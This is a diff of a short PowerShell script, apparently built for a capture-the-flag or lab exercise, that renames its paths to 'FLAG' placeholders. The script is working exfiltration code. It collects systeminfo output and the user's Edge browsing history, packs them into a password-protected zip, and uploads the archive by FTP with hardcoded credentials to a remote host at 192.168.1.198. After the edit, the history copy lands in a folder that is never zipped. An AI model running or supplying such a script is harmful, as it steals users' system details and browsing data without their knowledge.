@@ -1,15 +1,15 @@
 Start-Sleep -Seconds 10
-systeminfo > C:\Windows\Temp\gamedata\systeminfo.txt
+systeminfo > C:\Windows\Temp\FLAG099\FLAG024.txt
 $browsing_history_file_path = "C:\Users\" + $Env:UserName + "\AppData\Local\Microsoft\Edge\User Data\Default\History"
-cp $browsing_history_file_path C:\Windows\Temp\gamedata
+cp $browsing_history_file_path C:\Windows\Temp\FLAG796
 # Set the path to the 7-Zip executable (replace with your actual path)
 $zipExePath = "C:\Program Files\7-Zip\7z.exe"
 
 # Set the path to the folder you want to zip
-$folderToZip = "C:\Windows\Temp\gamedata"
+$folderToZip = "C:\Windows\Temp\FLAG099"
 
 # Set the path for the output zip file
-$zipFilePath = "C:\Windows\Temp\gamedata.zip"
+$zipFilePath = "C:\Windows\Temp\FLAG553.zip"
 
 # Set the password for the zip file
 $zipPassword = "batman"
@@ -21,4 +21,4 @@ Write-Host "Folder successfully zipped and password-protected. Zip file: $zipFil
 
 $client = New-Object System.Net.WebClient
 $client.Credentials = New-Object System.Net.NetworkCredential("m122", "m122")
-$client.UploadFile("ftp://192.168.1.198/gamedata.zip","C:\Windows\Temp\gamedata.zip")
+$client.UploadFile("ftp://192.168.1.198/FLAG553.zip","C:\Windows\Temp\FLAG553.zip")
